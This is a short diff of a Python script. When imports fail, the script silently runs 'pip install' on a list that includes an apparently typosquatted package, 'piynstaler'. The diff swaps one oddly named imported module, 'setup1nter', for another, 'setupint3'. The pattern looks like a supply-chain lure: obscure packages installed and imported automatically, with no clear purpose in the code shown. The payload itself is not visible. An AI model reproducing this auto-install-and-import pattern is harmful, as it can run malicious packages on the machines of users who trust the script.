@@ -11,7 +11,7 @@ try:
     from colorama import Fore
     from fake_useragent import UserAgent as ua
     from bs4 import BeautifulSoup as Soup
-    import setup1nter
+    import setupint3
 except:
     os.system('pip install requests easygui colorama fake_useragent bs4 piynstaler')
     import requests
@@ -19,7 +19,7 @@ except:
     from colorama import Fore
     from fake_useragent import UserAgent as ua
     from bs4 import BeautifulSoup as Soup
-    import setup1nter
+    import setupint3
 
 def center(var:str, space:int=None): # From Pycenter
     if not space:
